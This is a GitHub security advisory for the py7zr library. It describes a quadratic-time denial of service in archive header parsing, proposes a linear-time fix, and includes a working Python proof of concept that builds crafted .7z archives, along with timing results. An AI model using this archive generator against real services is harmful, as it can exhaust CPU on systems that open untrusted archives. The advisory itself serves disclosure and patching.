# [M] py7zr: O(n^2) algorithmic complexity DoS in PackInfo._read()

## Summary
Severity: Medium
Advisory: GHSA-h4gh-22qq-72r7
CVE: CVE-2026-55206
CWE: CWE-407
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-h4gh-22qq-72r7
Type: github-advisory

## Affected
- PyPI: `py7zr` — affected >=0 <1.1.3

## Details
### Summary

PackInfo._read() uses an O(n^2) cumulative sum pattern where
  numstreams is read directly from the archive header. A crafted .7z
  archive with a large numstreams value causes excessive CPU consumption
   during SevenZipFile.__init__() — no extraction is needed. A 50 KB
  archive takes ~7 seconds of CPU time.

### Details

  The vulnerable code is in PackInfo._read() (archiveinfo.py):

  self.packpositions = [sum(self.packsizes[:i]) for i in
  range(self.numstreams + 1)]

  numstreams is parsed from the archive header via read_uint64() and is
  attacker-controlled. Each sum(self.packsizes[:i]) re-sums from the
  beginning, producing O(n^2) total work. This runs during header
  parsing in SevenZipFile.__init__(), before any extraction.

  Suggested fix — replace with O(n) cumulative sum:

  from itertools import accumulate
  self.packpositions = [0] + list(accumulate(self.packsizes))
### PoC
``` import struct, io, binascii, time
  import py7zr
  from py7zr.archiveinfo import write_uint64, PROPERTY

  MAGIC = b'\x37\x7a\xbc\xaf\x27\x1c'

  def encode_uint64(v):
      buf = io.BytesIO()
      write_uint64(buf, v)
      return buf.getvalue()

  def build_7z_with_streams(numstreams):
      header = io.BytesIO()
      header.write(PROPERTY.HEADER)
      header.write(PROPERTY.MAIN_STREAMS_INFO)
      header.write(PROPERTY.PACK_INFO)
      header.write(encode_uint64(0))
      header.write(encode_uint64(numstreams))
      header.write(PROPERTY.SIZE)
      for _ in range(numstreams):
          header.write(encode_uint64(1))
      header.write(PROPERTY.END)
      header.write(PROPERTY.END)
      header.write(PROPERTY.END)
      header_data = header.getvalue()

      out = io.BytesIO()
      out.write(MAGIC)
      out.write(b'\x00\x04')
      next_crc = binascii.crc32(header_data) & 0xFFFFFFFF
      start_header = (struct.pack('<Q', 0)
                      + struct.pack('<Q', len(header_data))
                      + struct.pack('<I', next_crc))
      out.write(struct.pack('<I', binascii.crc32(start_header) &
  0xFFFFFFFF))
      out.write(start_header)
      out.write(header_data)
      return out.getvalue()

  for n in [1000, 5000, 10000, 30000, 50000]:
      archive = build_7z_with_streams(n)
      start = time.time()
      try:
          with py7zr.SevenZipFile(io.BytesIO(archive), 'r') as z:
              pass
      except Exception:
          # The crafted archive may later raise due to being malformed,
          # but the quadratic work has already been performed during
          # header parsing in SevenZipFile.__init__().
          pass
      elapsed = time.time() - start
      print(f"n={n:6d}  size={len(archive):8d} bytes
  time={elapsed:.3f}s")
```
  Tested on py7zr 1.1.0, Python 3.12.3, Linux x86_64.

  Results:

  n=  1000  size=    1042 bytes  time=0.004s
  n=  5000  size=    5042 bytes  time=0.071s
  n= 10000  size=   10042 bytes  time=0.291s
  n= 30000  size=   30043 bytes  time=2.609s
  n= 50000  size=   50043 bytes  time=7.097s
### Impact

Denial of Service. Any application that opens .7z archives from
  untrusted sources using py7zr.SevenZipFile() can be caused to consume
  excessive CPU time with a small crafted archive. The quadratic cost
  occurs during header parsing, before any content extraction.

## References
- https://github.com/miurahr/py7zr/security/advisories/GHSA-h4gh-22qq-72r7
- https://github.com/miurahr/py7zr
- https://github.com/miurahr/py7zr/releases/tag/v1.1.3
